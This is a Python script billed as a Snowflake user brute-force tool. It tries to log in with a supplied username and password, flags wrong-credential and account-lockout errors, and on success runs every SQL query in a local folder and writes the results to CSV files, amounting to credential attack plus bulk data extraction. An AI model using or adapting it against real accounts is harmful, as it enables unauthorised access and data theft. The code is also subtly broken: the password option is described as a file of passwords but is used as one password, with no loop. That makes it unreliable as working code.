import snowflake.connector
import pandas as pd
import argparse
import os

# Authentication errors
INVALID_CREDES_ERROR = 'Incorrect username or password was specified.'
USER_LOCKED_ERROR = 'Your user account has been temporarily locked due to too many failed attempts.'

# Set up argument parser
parser = argparse.ArgumentParser(description='Snowflake user brute force',
                                 allow_abbrev=False, add_help=False)
parser.add_argument('-a', '--account', help='Snowflake account', required=True)
parser.add_argument('-u', '--username', help='Okta username', required=True)
parser.add_argument('-p', '--password', help='File containing passwords', required=True)
parser.add_argument('-d', '--db', help='Databse Name', required=True)
args = parser.parse_args()

def get_queries():
    # Snowflake queries location
    QUERIES_LOCATION = f"{os.path.dirname(__file__)}/queries"
    queries = {}
    for file_name in os.listdir(QUERIES_LOCATION):
        queries[file_name] = open(f"{QUERIES_LOCATION}/{file_name}","r").read()
    return queries

def main():
    # Snowflake Connection Parameters
    connection_params = {
            'account': args.account,
            'user': args.username,
            'password': args.password,
            'warehouse': 'COMPUTE_WH',
            'database': args.db,
            'schema': 'PUBLIC'
        }

    # Send authentication request
    try:
        conn = snowflake.connector.connect(**connection_params)
    except Exception as e:
        error = 'Authentication failed - '
        conn = None
        if INVALID_CREDES_ERROR in str(e):
            error += 'wrong credentials'
        elif USER_LOCKED_ERROR in str(e):
            error += 'user is locked'
        print(error)

    if conn!=None:
        print(f"Successfully logged in to Snowflake as {args.username}")
    else:
        print('Failed to authenticate')
        exit(1)

    # Execute the quesries and save the results to CSVs
    cursor = conn.cursor()
    queries = get_queries()
    for query in queries:
        print(query)
        cursor.execute(queries[query])
        result = cursor.fetchall()
        df = pd.DataFrame(result, columns=[desc[0] for desc in cursor.description])
        df.to_csv(f'{query}_results.csv', index=False)

if __name__ == '__main__':
    main()